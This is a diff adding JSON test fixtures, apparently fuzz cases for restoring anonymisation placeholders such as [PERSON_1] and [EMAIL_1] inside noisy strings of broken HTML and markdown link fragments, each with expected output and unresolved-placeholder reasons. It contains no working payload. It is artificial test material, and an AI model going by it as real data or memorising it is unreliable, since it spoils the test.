+   "text": "[[person-1]x//[person-1]//https://![a][1]:  é",
+   "restored": "[Anna Petrovax//[person-1]//https://![a][1]:  é",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ">[person-1]x<a href=PERSON_1([person-1][URL_WITH_TOKEN_1]\"//<img src='PERSON[LITERAL_1][PERSON_1]",
+   "restored": ">Anna Petrovax<a href=PERSON_1([person-1][URL_WITH_TOKEN_1]\"//<img src='PERSON[LITERAL_1][PERSON_1]",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2éwww.EMAIL_1![a]é<a href=[",
+   "restored": "PERSON 2éwww.anna@example.org![a]é<a href=[",
+   "unresolved": []
+  },
+  {
+   "text": "      [EMAIL_2]2",
+   "restored": "      [EMAIL_2]2",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "<img src='[EMAIL_1]x[PERSON_2]",
+   "restored": "<img src='[EMAIL_1]x[PERSON_2]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "  [person-1]_ www.",
+   "restored": "  Anna Petrova_ www.",
+   "unresolved": []
+  },
+  {
+   "text": "![a]![a][person-1].[EMAIL_1][URL_WITH_TOKEN_1][",
+   "restored": "![a]![a]Anna Petrova.anna@example.orghttps://intranet.example/doc?token=abc[",
+   "unresolved": []
+  },
+  {
+   "text": "<[LITERAL_1]_www.[EMAIL_2]",
+   "restored": "<[PERSON_1]_www.[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<[1]:éé=[PERSON_2]]([PERSON_1]é =<img src='",
+   "restored": "<[1]:éé=Karen Example]([PERSON_1]é =<img src='",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]\n'><https:[EMAIL_2]\"[PERSON_1]<https:\"=[EMAIL_2]",
+   "restored": "https://intranet.example/doc?token=abc\n'><https:[EMAIL_2]\"[PERSON_1]<https:\"=[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_1]<a href=//<",
+   "restored": "Anna Petrova<a href=//<",
+   "unresolved": []
+  },
+  {
+   "text": "=>",
+   "restored": "=>",
+   "unresolved": []
+  },
+  {
+   "text": ".[person-1]<\n\nwww.PERSON 2www.EMAIL_1PERSON 2<a href=[URL_WITH_TOKEN_1]https://www.\n\n",
+   "restored": ".Anna Petrova<\n\nwww.PERSON 2www.EMAIL_1PERSON 2<a href=[URL_WITH_TOKEN_1]https://www.\n\n",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https:(<\n\n[PERSON_2]=22![a]",
+   "restored": "<https:(<\n\nKaren Example=22![a]",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]PERSON 2\n [LITERAL_1]<a href=éPERSON 22[LITERAL_1]](x",
+   "restored": "anna@example.orgPERSON 2\n [PERSON_1]<a href=éPERSON 22[PERSON_1]](x",
+   "unresolved": []
+  },
+  {
+   "text": "\"<a href=<img src='////=https://",
+   "restored": "\"<a href=<img src='////=https://",
+   "unresolved": []
+  },
+  {
+   "text": "x2=[EMAIL_2]](",
+   "restored": "x2=[EMAIL_2]](",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "]([person-1]![a]_é2[1]: \" \n\n",
+   "restored": "]([person-1]![a]_é2[1]: \" \n\n",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "2(https://",
+   "restored": "2(https://",
+   "unresolved": []
+  },
+  {
+   "text": ")\"",
+   "restored": ")\"",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]<https:https://<//PERSON([PERSON_2]\n",
+   "restored": "anna@example.org<https:https://<//PERSON([PERSON_2]\n",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n[![a]>www.\"PERSON 2",
+   "restored": "\n[![a]>www.\"PERSON 2",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.PERSON<[LITERAL_1]_[![a][EMAIL_1]",
+   "restored": "www.PERSON<[LITERAL_1]_[![a][EMAIL_1]",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "https://>= \n\n",
+   "restored": "https://>= \n\n",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2][LITERAL_1]PERSON_1\n\nx",
+   "restored": "Karen Example[PERSON_1]PERSON_1\n\nx",
+   "unresolved": []
+  },
+  {
+   "text": "é[PERSON_1][person-1]=[   https://EMAIL_1[1]:",
+   "restored": "éAnna PetrovaAnna Petrova=[   https://EMAIL_1[1]:",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1][EMAIL_1",
+   "restored": "https://intranet.example/doc?token=abc[EMAIL_1",
+   "unresolved": []
+  },
+  {
+   "text": "  [EMAIL_1]2PERSON_1[PERSON_1][LITERAL_1][1]:PERSONPERSON_1<img src='[LITERAL_1]//[\n\n",
+   "restored": "  anna@example.org2PERSON_1Anna Petrova[PERSON_1][1]:PERSONPERSON_1<img src='[LITERAL_1]//[\n\n",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]EMAIL_1[person-1]<img src='[.(>//[1]:[PERSON_1][PERSON_1]",
+   "restored": "[EMAIL_2]EMAIL_1Anna Petrova<img src='[.(>//[1]:[PERSON_1][PERSON_1]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img src='  www.<https:https://x[https://2",
+   "restored": "<img src='  www.<https:https://x[https://2",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2]\n<img src='PERSON 2",
+   "restored": "Karen Example\n<img src='PERSON 2",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "(",
+   "restored": "(",
+   "unresolved": []
+  },
+  {
+   "text": "\n[EMAIL_1]//[1]:\n\n<[1]:é",
+   "restored": "\nanna@example.org//[1]:\n\n<[1]:é",
+   "unresolved": []
+  },
+  {
+   "text": "\"",
+   "restored": "\"",
+   "unresolved": []
+  },
+  {
+   "text": "\n<=([PERSON_1]<a href=_[person-1]![a]é(<img src='",
+   "restored": "\n<=(Anna Petrova<a href=_[person-1]![a]é(<img src='",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "([1]:  [1]://<a href=EMAIL_1é)[1]:é\nPERSON 2",
+   "restored": "([1]:  [1]://<a href=EMAIL_1é)[1]:é\nKaren Example",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]=PERSON 2![a][PERSON_2][URL_WITH_TOKEN_1]\nPERSON 2PERSON 2)",
+   "restored": "https://intranet.example/doc?token=abc=PERSON 2![a]Karen Examplehttps://intranet.example/doc?token=abc\nPERSON 2PERSON 2)",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": " <https:[EMAIL_2][EMAIL_1]](\"(",
+   "restored": " <https:[EMAIL_2][EMAIL_1]](\"(",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[  PERSON_1",
+   "restored": "[  Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "><\" ](",
+   "restored": "><\" ](",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1][EMAIL_1]",
+   "restored": "Anna Petrovaanna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]'\n[EMAIL_2]2",
+   "restored": "anna@example.org'\n[EMAIL_2]2",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "![a]>'<img src='\n\n[EMAIL_1]PERSON 2x(<] (",
+   "restored": "![a]>'<img src='\n\n[EMAIL_1]PERSON 2x(<] (",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<x[PERSON_2]\nhttps://=",
+   "restored": "<xKaren Example\nhttps://=",
+   "unresolved": []
+  },
+  {
+   "text": ">",
+   "restored": ">",
+   "unresolved": []
+  },
+  {
+   "text": "  ",
+   "restored": "  ",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON 2//",
+   "restored": "Karen Example//",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1]\"<www.",
+   "restored": "Anna Petrova\"<www.",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1//<https:www.<img src='[PERSON_1]",
+   "restored": "Anna Petrova//<https:www.<img src='Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1][PERSON_2][1]:EMAIL_1x  >//\n\né[LITERAL_1]é",
+   "restored": "Anna PetrovaKaren Example[1]:EMAIL_1x  >//\n\né[PERSON_1]é",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]<img src='[URL_WITH_TOKEN_1]",
+   "restored": "Anna Petrova<img src='[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "https://<https:<https:  <[EMAIL_1]_(=](",
+   "restored": "https://<https:<https:  <anna@example.org_(=](",
+   "unresolved": []
+  },
+  {
+   "text": "\n[person-1]PERSON_1x",
+   "restored": "\nAnna PetrovaPERSON_1x",
+   "unresolved": []
+  },
+  {
+   "text": "]<https:](\n\nEMAIL_1[person-1]//[EMAIL_1]![a]",
+   "restored": "]<https:](\n\nEMAIL_1Anna Petrova//[EMAIL_1]![a]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\né",
+   "restored": "\né",
+   "unresolved": []
+  },
+  {
+   "text": " )[1]:[LITERAL_1]\n  https://][EMAIL_2]<a href=<a href=www.",
+   "restored": " )[1]:[PERSON_1]\n  https://][EMAIL_2]<a href=<a href=www.",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.<////( https://)https://https://",
+   "restored": "www.<////( https://)https://https://",
+   "unresolved": []
+  },
+  {
+   "text": "<a href=.(",
+   "restored": "<a href=.(",
+   "unresolved": []
+  },
+  {
+   "text": "[person-1]=//https://_[",
+   "restored": "Anna Petrova=//https://_[",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1  PERSON_1EMAIL_1",
+   "restored": "anna@example.org  PERSON_1EMAIL_1",
+   "unresolved": []
+  },
+  {
+   "text": "x",
+   "restored": "x",
+   "unresolved": []
+  },
+  {
+   "text": "[1]: <PERSON_1<a href=[1]:[EMAIL_2]PERSON 2(.([person-1]<_",
+   "restored": "[1]: <PERSON_1<a href=[1]:[EMAIL_2]PERSON 2(.([person-1]<_",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ") //[PERSON_1]EMAIL_1'![a]PERSON_1<\"[URL_WITH_TOKEN_1]PERSON_1![a]//",
+   "restored": ") //[PERSON_1]EMAIL_1'![a]PERSON_1<\"[URL_WITH_TOKEN_1]PERSON_1![a]//",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![a]",
+   "restored": "![a]",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]<https:\n<)<img src='[person-1]![a]PERSON_1é2x[person-1]\n",
+   "restored": "Anna Petrova<https:\n<)<img src='[person-1]![a]PERSON_1é2x[person-1]\n",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "=2",
+   "restored": "=2",
+   "unresolved": []
+  },
+  {
+   "text": "][EMAIL_1]](",
+   "restored": "]anna@example.org](",
+   "unresolved": []
+  },
+  {
+   "text": "www.\n<a href=<img src='\nPERSON 2<img src='",
+   "restored": "www.\n<a href=<img src='\nPERSON 2<img src='",
+   "unresolved": [
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON'\n\n[PERSON_2]<(==![a][PERSON_1]\n\n",
+   "restored": "PERSON'\n\nKaren Example<(==![a]Anna Petrova\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "\n\n[EMAIL_2][EMAIL_1]",
+   "restored": "\n\n[EMAIL_2]anna@example.org",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON<  ]([LITERAL_1][PERSON_1]PERSON 2",
+   "restored": "PERSON<  ]([LITERAL_1][PERSON_1]PERSON 2",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]=[EMAIL_1]PERSON<_]([URL_WITH_TOKEN_1]'",
+   "restored": "https://intranet.example/doc?token=abc=[EMAIL_1]PERSON<_]([URL_WITH_TOKEN_1]'",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "]([]([person-1]EMAIL_1",
+   "restored": "]([]([person-1]EMAIL_1",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "é(<img src='[LITERAL_1]PERSON_1x<https:",
+   "restored": "é(<img src='[LITERAL_1]PERSON_1x<https:",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ">",
+   "restored": ">",
+   "unresolved": []
+  },
+  {
+   "text": "]([1]:",
+   "restored": "]([1]:",
+   "unresolved": []
+  },
+  {
+   "text": "=(x)PERSON![a]PERSON_1=[](",
+   "restored": "=(x)PERSON![a]PERSON_1=[](",
+   "unresolved": []
+  },
+  {
+   "text": "'[EMAIL_2][URL_WITH_TOKEN_1]https://(PERSON_12",
+   "restored": "'[EMAIL_2]https://intranet.example/doc?token=abchttps://(PERSON_12",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "PERSON_12",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON_1<https:[EMAIL_2]>  2<img src='\n<img src='.https://\n\n><",
+   "restored": "Anna Petrova<https:[EMAIL_2]>  2<img src='\n<img src='.https://\n\n><",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "_ )[PERSON_2][PERSON_1]é  https://",
+   "restored": "_ )Karen ExampleAnna Petrovaé  https://",
+   "unresolved": []
+  },
+  {
+   "text": "  )x=EMAIL_1[person-1][LITERAL_1]'",
+   "restored": "  )x=EMAIL_1Anna Petrova[PERSON_1]'",
+   "unresolved": []
+  },
+  {
+   "text": "<[EMAIL_1] __PERSON_1PERSON_1",
+   "restored": "<anna@example.org __PERSON_1PERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1][EMAIL_1]<https:_[EMAIL_1]PERSON 2_>[LITERAL_1][PERSON_2][person-1]",
+   "restored": "[PERSON_1]anna@example.org<https:_[EMAIL_1]PERSON 2_>[PERSON_1]Karen ExampleAnna Petrova",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_2]([LITERAL_1]é<a href=]([1]:[person-1]'//",
+   "restored": "[EMAIL_2]([LITERAL_1]é<a href=]([1]:[person-1]'//",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https:www.  ",
+   "restored": "<https:www.  ",
+   "unresolved": []
+  },
+  {
+   "text": "//_x",
+   "restored": "//_x",
+   "unresolved": []
+  },
+  {
+   "text": ".//_https://",
+   "restored": ".//_https://",
+   "unresolved": []
+  },
+  {
+   "text": "<PERSON_1()=](",
+   "restored": "<Anna Petrova()=](",
+   "unresolved": []
+  },
+  {
+   "text": "www.<https:>](//[EMAIL_2][PERSON 2< 2",
+   "restored": "www.<https:>](//[EMAIL_2][PERSON 2< 2",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ".EMAIL_1//]=<//><",
+   "restored": ".anna@example.org//]=<//><",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]<\"[EMAIL_1] [1]:)PERSON 2<a href=[",
+   "restored": "https://intranet.example/doc?token=abc<\"[EMAIL_1] [1]:)Karen Example<a href=[",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img src='.<https:[PERSON_1]PERSON_1",
+   "restored": "<img src='.<https:[PERSON_1]PERSON_1",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]<a href=\n\n\n",
+   "restored": "https://intranet.example/doc?token=abc<a href=\n\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "<PERSON 2[LITERAL_1]é[1]:PERSON_1[PERSON_2]PERSON 2[PERSON_1]",
+   "restored": "<PERSON 2[PERSON_1]é[1]:PERSON_1Karen ExamplePERSON 2Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "'<img src='EMAIL_1['][1]:\n.<img src='",
+   "restored": "'<img src='EMAIL_1['][1]:\n.<img src='",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]![a]<x]([LITERAL_1][PERSON_1]https://[URL_WITH_TOKEN_1] ",
+   "restored": "[PERSON_1]![a]<x]([LITERAL_1][PERSON_1]https://[URL_WITH_TOKEN_1] ",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[person-1][URL_WITH_TOKEN_1]",
+   "restored": "Anna Petrovahttps://intranet.example/doc?token=abc",
+   "unresolved": []
+  },
+  {
+   "text": "www.=//[PERSON_1]PERSON 22'. [éhttps://]([PERSON_1]",
+   "restored": "www.=//[PERSON_1]PERSON 22'. [éhttps://]([PERSON_1]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2",
+   "restored": "Karen Example",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2]=)https://](PERSON 2EMAIL_1[PERSON_1]2",
+   "restored": "Karen Example=)https://](PERSON 2EMAIL_1[PERSON_1]2",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "([URL_WITH_TOKEN_1]\n([_\n)_<img src='[person-1]",
+   "restored": "(https://intranet.example/doc?token=abc\n([_\n)_<img src='[person-1]",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2x][PERSON_1]>",
+   "restored": "PERSON 2x]Anna Petrova>",
+   "unresolved": []
+  },
+  {
+   "text": "\n\n  [EMAIL_1] )[1]:EMAIL_1//[1]:PERSON_1[EMAIL_2]\"//PERSON 2",
+   "restored": "\n\n  anna@example.org )[1]:anna@example.org//[1]:PERSON_1[EMAIL_2]\"//PERSON 2",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "2\n\n[//<a href=",
+   "restored": "2\n\n[//<a href=",
+   "unresolved": []
+  },
+  {
+   "text": "![a][EMAIL_1]_[PERSON_1]](//https://(](<https:(",
+   "restored": "![a]anna@example.org_Anna Petrova](//https://(](<https:(",
+   "unresolved": []
+  },
+  {
+   "text": "\"https://>]xx[",
+   "restored": "\"https://>]xx[",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1][PERSON_2]\n\n[1]:PERSON<img src='![a]=.[person-1]PERSON](",
+   "restored": "Anna PetrovaKaren Example\n\n[1]:PERSON<img src='![a]=.[person-1]PERSON](",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON_1[PERSON_2][EMAIL_2]",
+   "restored": "PERSON_1Karen Example[EMAIL_2]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "]('",
+   "restored": "]('",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2][PERSON_2]PERSON_1",
+   "restored": "Karen ExampleKaren ExamplePERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1[person-1]PERSON_1",
+   "restored": "PERSON_1Anna PetrovaPERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": ".<",
+   "restored": ".<",
+   "unresolved": []
+  },
+  {
+   "text": "][person-1]>EMAIL_1",
+   "restored": "]Anna Petrova>anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "![a]![a][EMAIL_2]PERSON_1",
+   "restored": "![a]![a][EMAIL_2]PERSON_1",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]",
+   "restored": "anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "<a href=xEMAIL_1[LITERAL_1]EMAIL_1![a]<a href=<https:\"\n\n//[PERSON_2]'//",
+   "restored": "<a href=xEMAIL_1[LITERAL_1]EMAIL_1![a]<a href=<https:\"\n\n//[PERSON_2]'//",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2<<https:_x",
+   "restored": "Karen Example<<https:_x",
+   "unresolved": []
+  },
+  {
+   "text": "<a href=[PERSON_2]\n[PERSON_2]\n\n[EMAIL_1'xPERSON 2]PERSON![a][EMAIL_1]",
+   "restored": "<a href=[PERSON_2]\nKaren Example\n\n[EMAIL_1'xPERSON 2]PERSON![a]anna@example.org",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=](\n\n[PERSON_1][(<a href=PERSON 2[PERSON_1]'",
+   "restored": "<a href=](\n\nAnna Petrova[(<a href=PERSON 2Anna Petrova'",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1é)é.'_//",
+   "restored": "EMAIL_1é)é.'_//",
+   "unresolved": []
+  },
+  {
+   "text": "](<a href=![a][1]:é]([EMAIL_2][EMAIL_1]é2",
+   "restored": "](<a href=![a][1]:é]([EMAIL_2][EMAIL_1]é2",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1<https:'EMAIL_1==[EMAIL_1]\n\n[PERSON_2]<![a]<img src='//",
+   "restored": "anna@example.org<https:'EMAIL_1==[EMAIL_1]\n\nKaren Example<![a]<img src='//",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "]_](>[1]:  [LITERAL_1]",
+   "restored": "]_](>[1]:  [LITERAL_1]",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON_1'.<https:[[URL_WITH_TOKEN_1] 2<https:",
+   "restored": "Anna Petrova'.<https:[[URL_WITH_TOKEN_1] 2<https:",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "   //",
+   "restored": "   //",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:[LITERAL_1]\"  https://_(www.<img src='[URL_WITH_TOKEN_1]",
+   "restored": "[1]:[LITERAL_1]\"  https://_(www.<img src='[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]https://<https:['](https://<https:(//EMAIL_1](",
+   "restored": "https://intranet.example/doc?token=abchttps://<https:['](https://<https:(//EMAIL_1](",
+   "unresolved": []
+  },
+  {
+   "text": "EMAIL_1(>[URL_WITH_TOKEN_1][URL_WITH_TOKEN_1]<img src='<img src='\n\nwww.(EMAIL_1",
+   "restored": "anna@example.org(>https://intranet.example/doc?token=abc[URL_WITH_TOKEN_1]<img src='<img src='\n\nwww.(EMAIL_1",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1www.![a]>  PERSON_1[PERSON_1]=\n\n[1]:_",
+   "restored": "EMAIL_1www.![a]>  PERSON_1Anna Petrova=\n\n[1]:_",
+   "unresolved": []
+  },
+  {
+   "text": "<a href=  [PERSON_2][URL_WITH_TOKEN_1]//=[PERSON_1]https://\n\nPERSON.",
+   "restored": "<a href=  [PERSON_2][URL_WITH_TOKEN_1]//=[PERSON_1]https://\n\nPERSON.",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n[1]:.[1]:)[EMAIL_2]  \n\n<https://EMAIL_1\n",
+   "restored": "\n[1]:.[1]:)[EMAIL_2]  \n\n<https://EMAIL_1\n",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "=](//\n\n",
+   "restored": "=](//\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "  [PERSON_2]\n[)<https:[PERSON_1]>",
+   "restored": "  Karen Example\n[)<https:[PERSON_1]>",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "éEMAIL_1PERSON_1//]![a]]((['EMAIL_1PERSON  ]",
+   "restored": "éEMAIL_1PERSON_1//]![a]]((['EMAIL_1PERSON  ]",
+   "unresolved": []
+  },
+  {
+   "text": "x_[PERSON_2]<",
+   "restored": "x_Karen Example<",
+   "unresolved": []
+  },
+  {
+   "text": "\"\n  ![a])=_[EMAIL_2]'",
+   "restored": "\"\n  ![a])=_[EMAIL_2]'",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2//www.>=PERSON 2[PERSON_1][person-1]\n\n'",
+   "restored": "Karen Example//www.>=PERSON 2Anna PetrovaAnna Petrova\n\n'",
+   "unresolved": []
+  },
+  {
+   "text": "//EMAIL_1[1]:<img src='=[[1]:=  ![a]",
+   "restored": "//EMAIL_1[1]:<img src='=[[1]:=  ![a]",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1][person-1](",
+   "restored": "[PERSON_1]Anna Petrova(",
+   "unresolved": []
+  },
+  {
+   "text": "2[1]:[URL_WITH_TOKEN_1]'\n  <a href=2",
+   "restored": "2[1]:https://intranet.example/doc?token=abc'\n  <a href=2",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]x'[1]:www.>//\n\n)x[PERSON_1]",
+   "restored": "[PERSON_1]x'[1]:www.>//\n\n)xAnna Petrova",
+   "unresolved": []
+  },
+  {
